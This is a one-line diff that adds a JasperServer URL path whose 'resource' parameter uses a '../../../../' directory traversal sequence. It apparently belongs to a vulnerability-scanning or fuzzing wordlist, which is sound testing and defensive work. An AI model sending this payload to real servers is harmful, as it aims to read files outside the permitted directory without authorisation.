@@ -1,0 +1,1 @@
+/jasperserver/reportresource/reportresource/?resource=net/sf/jasperreports/../../../../
